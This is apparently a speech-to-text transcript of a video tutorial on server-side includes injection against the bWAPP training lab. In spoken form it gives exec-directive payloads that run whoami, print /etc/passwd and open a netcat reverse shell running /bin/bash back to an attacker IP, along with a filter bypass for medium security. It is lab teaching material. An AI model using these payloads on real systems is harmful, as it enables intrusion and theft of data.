@@ -1,0 +1,479 @@
+hey guys welcome back to the bug bounty
+series in this video we're going to be
+taking a look at server side includes
+injection
+or ssi injection so let's get started so
+the environment we're using is the same
+we're using be box with bwap alright so
+i'm just going to select the bug we've
+taken a look at all the other types of
+injection now
+it's time to take a look at server side
+includes injection which is quite
+important
+to cover and an extremely dangerous
+attack as well
+all right so you can see on this web
+page here we have what is your ip
+address lookup
+web page which essentially asks for your
+first name and last name so
+to first of all understand what ssi is
+which is server side includes all right
+we're not talking about the injection
+yet
+so what is ssi uh ssi is a server-side
+scripting language that is used on the
+web
+all right so it is supported by apache
+engines and microsoft i
+iis web servers all right now the
+extensions that it uses and some of you
+may already have come across them before
+are the dot shtml or dot stm
+or dot shdm and i'll get to that in a
+second
+so ssi are used to execute some actions
+before the current page is loaded or
+while the page is being visualized
+in order to do so the web server
+analyzes the ssi before supplying the
+page to the user
+all right so it is of it is very
+commonly used to save time when
+developing web apps with dynamic content
+for example if you have a web app that
+has various web pages that
+require dynamic content uh like the logo
+and header to load
+ssi allows you to include this in every
+web page that requires the header or
+the dynamic content by using an include
+directive
+now the various ssi directives are not
+get into the language specifically but
+it is a very simple language to learn
+and i recommend that you learn the
+basics of the syntax rather
+so the various ssi directives are as
+follows so you have the include
+you have the execute directives and then
+they all have their parameters
+i'll show you the syntax in a second and
+we'll take a look at them so
+before we actually do that let's take a
+look at how what this web application
+is essentially doing so for this i'm
+just going to say uh
+for the first name i'll say alexis here
+and for the last name i'll
+put in paper the frog here and let's hit
+lookup
+and i'll just hit look up here and you
+can see that first of all it gives us
+the extension as
+html which again means that we are using
+ssi here
+but that's besides the point when
+performing this test on a web page
+i'll show you what to look out for so
+you can see it tells us
+alexis here your ip address is
+192.168.1.11
+um so you might be wondering well what
+exactly or how exactly is this web page
+getting our ip address our local ip
+address so
+if i view the source of the page which
+is not telling us anything right now
+anything much
+what you need to do is analyze that this
+html page which essentially once you
+analyze the code
+you'll realize it's using ssi to load
+this particular
+script that essentially gets the local
+ip and loads it up to us or reflects it
+back to us
+but that's not why we're looking or what
+what's important right now
+uh now to explain ssi and its directives
+uh first of all the syntax is very very
+simple so
+ssi to include it within any of the
+input fields
+is uh is again as as follows so
+this is the syntax so similar to what
+you'd have with html except uh
+similar to what you would have with an
+html comment uh so you have your
+your your your less than sign uh you
+have your exclamation mark
+and you have your two hyphens over here
+and then after this we include the
+directive now there are various
+directives
+for ssi i'm going to be going over the
+ones that are the most
+important when performing attacks the
+first one is the include directive
+and the include directive or any
+directive is
+first of all started by the uh the hash
+symbol all right so once you include the
+symbol you include the directive the
+first one is going to be the include
+directive all right so
+the include directive is going to be
+equal to so let me explain what the
+include directive is
+so the include directive allows the
+content of one document to be translated
+into another
+so this parameter will specify the file
+to be included all right so
+again this is the directive here we then
+specify the parameter which is going to
+be the file
+or the do to be included so that could
+be for example
+html whatever the case however this is
+not really important in this case
+the directive we are looking for is the
+exec
+directive all right so the syntax is as
+follows so let me just type out the
+syntax for you
+so we have the command or the directive
+all right so i'll call it a directive
+so directive and then we have the
+parameter
+right over here which is then going to
+be equal to
+the value etc etc so for example if i
+want to execute a system level command
+i can say like so and then i specify
+exec
+the exact directive all right
+and then after this i would give in the
+parameter that we're using
+in this case the cmd parameter
+essentially specifies the server side
+command so
+this will execute any server side
+command irregardless of whether it's
+running on a linux server
+or on a windows server so for example i
+can say cmd
+and that is the parameter so cmd is
+going to be equal to i put in my
+quotation marks
+and because you're on a linux server i
+can say uh who
+am i uh so this is a linux server or
+a linux linux command sorry
+so i close that up and again to close
+the ssi command
+uh right over here so this is the entire
+ssi command which is essentially going
+to print who
+am i so what i'll do is i'll cut that
+and i'll just say we'll put the first
+one as my name which is alexis and the
+last name
+is going to be equal to that particular
+ssi command so
+now this is particularly how you would
+essentially target a web application so
+if you're performing bug bounties
+the first thing to do is to is to
+essentially analyze
+the web application to see if the web
+app is properly validating the various
+input fields
+by testing the characters that are used
+in the ssi directives
+now i'll be linking below the the
+special characters that are reserved for
+ssi directives
+however if we just hit look up you can
+see it does give us the who am i data
+which is www data and it gives us the
+first
+piece of data which was hello over here
+so we know that it works and this
+is vulnerable to server side include
+injection
+because our security is set to low now
+let me explain
+what server side includes injection is
+so ssi injection essentially allows the
+exploitation of a web application by
+injecting scripts
+in the html pages or executing arbitrary
+codes remotely
+it can be used or exploited through the
+manipulation of ssi
+in the use of the application or to
+force it to use
+in through the user input fields which
+is what we're doing right now
+all right so i've mentioned analyzing
+the application the first thing you
+should do
+when performing these uh when
+essentially looking for this
+vulnerability in a web application
+is to check whether the web app is
+properly validating the various input
+fields
+by testing the characters limited or
+used in the ssi directives so the
+characters are
+the less than sign uh the exclamation
+mark the hash
+the equal to the forward slash the full
+stop and quotation marks
+and of course the hyphen and the greater
+than sign so those are the
+uh the these are essentially the uh
+the characters that are limited or
+specified
+uh when you know when using ssi
+directives so
+keep that in mind i will be linking this
+in the description if you are looking
+for the exact documentation
+all right so i'm going to be covering
+this on a low level security and on
+medium security and i'll explain why
+and why you should actually try and do
+this on your own
+when performing this on the high level
+security so
+uh let's get started now the first thing
+you want to do you maybe want to do is
+analyze uh how the post request
+or you essentially analyze the post
+request and how it's being sent to the
+server
+in what form the data is encoded but
+again i'll leave that to you because
+that's really not
+important here the thing to important
+here is the validation that the web
+application is performing
+on the different levels of security so
+we know at the low security we can
+execute these commands using ssi and you
+know we can execute the system level
+command so let's try something
+what i'm going to do is i'm going to say
+we're going to say exec
+uh and we'll say xxcmd by the way if
+you're running this on a windows server
+i
+i don't need to tell you that you simply
+need to change the linux commands
+to the windows command so again dir
+would be the appropriate here
+but in this case let's type in who am i
+for example
+uh and we'll just close the uh the ssi
+direct uh
+the the whole command sorry not the
+directive and in the bottom one here
+we'll also execute uh we'll say execute
+cmd is equal to and we can you know
+display some important information
+etsy password hc password
+and we will close that up right over
+here sorry
+and once we hit lookup that's going to
+display the information that we knew was
+going to be displayed so it's going to
+say hello
+and wwe data and the the etsy password
+file
+or the password file rather so that is
+how to do it on a basic level with low
+security now the other
+important thing is of course generating
+or getting a reverse shell
+and again to do that we're going to
+leverage net catch so
+to do this we're just going to open up a
+terminal here and i'll increase that so
+we're going to say
+netcat and vlp1234 listen on that
+particular port and
+and once that is done we will
+essentially set up the listener or we'll
+essentially set up the
+the connection here so i'm just going to
+set this uh the first
+name to reversion and of course you can
+execute any other commands
+uh so reverse shell and for the last
+name again this is where we will put in
+our
+our our ssi injection here so again
+we'll say execute the following so
+execute
+command or cmb is equal to
+and then within here we put our netcat
+command so again we're just going to say
+uh netcat nv oops sorry
+netcat nv you can also set up the list
+on the server and then connect to it uh
+via your own computer or with
+through the attacker's computer so uh nv
+192.168.1.1
+uh 0.101 that is on
+port one two three four and we want to
+execute bin bash here
+uh so again bin uh bin bash
+and we will close that up and we will
+close up
+the entire ssi injection here and hit
+lookup
+and hopefully we get a reverse
+connection and there you are you can see
+that
+we get we indeed do get the reverse
+connection
+so if i type in pwd or id or you name a
+we can see that we get all the relevant
+information to tell us that yes
+indeed we have got a reverse shell on
+our target all right so that
+is how to perform um ssi injection on a
+low level security on b web
+let's talk about medium security all
+right so let's go back here i'm going to
+set that to medium security
+and the reason i'm not covering all
+levels of security is because i want you
+guys to actually
+exercise this actively because i give
+you if i give you the
+uh the solutions to the problems what
+you're going to do is simply just type
+them and say hey
+i knew that with instead of actually
+testing this
+for yourself now why is changing the
+level of security and
+security important because it stimul it
+simulates
+uh the various security levels that you
+might find on web applications out there
+so
+in the first case we saw that it was not
+uh
+it was essentially not validating the
+various input fields
+are you know testing for the various
+characters that are used in the ssi
+directives
+now in this particular case it might be
+validating only some
+all right but not all so i'm just going
+to give you the solution of course but
+i'm going to just say for example test
+and with medium security so let's take a
+look at the at a basic
+uh standard ssi injection command so for
+example i'm going to say
+execute and then again i put in cmd here
+and then it's equal to who am i
+and i'm just going to close it all right
+so that is a basic one and if we
+let me just copy this because they want
+to type it keep on typing we can see
+that it does not execute it
+on a medium security level all right so
+now let me explain what is happening
+here
+uh because we have increased the level
+of security on the web application
+it is now sanitizing or validating the
+various input fields and it
+is now restricting a few of these
+characters used in the ssi directives
+all right so what it is doing is it's
+getting rid of a few of these characters
+so in this case i
+found by researching and by playing
+around with the various characters that
+i used in ssi directives by removing
+them
+and replacing them in this particular
+case
+the double quotation marks are being
+sanitized by the web applications so
+that means that the
+uh the quotation the quotation marks
+that are encapsulating
+the system level commands are being
+sanitized so what's happening here
+is it is executing uh the it is
+executing the ssi command however
+it is getting rid of this entire block
+here which is what we are looking for
+particularly so
+if i get rid of the two quotation marks
+uh
+you can see that if we'd look up uh for
+some reason that did not execute
+um let me just run that one more time
+here so
+did i put in that correctly i should it
+should be working now actually
+is that set to medium security level
+uh yeah it is all right so what i'll do
+is
+i will just enter alexis here
+and we will hit look up and there you
+are all right so
+there you are you can see that it does
+display the data that we're looking for
+and i can change it with anything else
+of course
+so i'll just type in alexis here and
+we'll paste that right in here
+uh so what i'll say is we'll get rid of
+all of this and you can
+you know i can type in ls for example i
+am essentially getting rid of the
+quotation marks again you look up here
+and there you go so
+that we know it is working on a medium
+level security and now again i want you
+to exercise this on high level security
+so what should you do that's what many
+people have been asking me
+this is fine for b-web but on a real web
+application
+how do i test the different levels of
+security and of course now we are simply
+testing
+uh the validation of the input fields by
+the web application all right so
+what you should do now is play around
+with the various ssi commands
+and with the syntax and see what the web
+application is sanitizing or stopping
+from being processed
+by the server all right so that is your
+goal and i want you to try it on the
+high level
+security so hopefully i've explained um
+ssi injection as clearly as possible if
+you have any questions
+or suggestions let me know in the
+comments section on my social networks
+or at the forum
+at hackersploit.org and i'll be seeing
+you in the next video
+peace
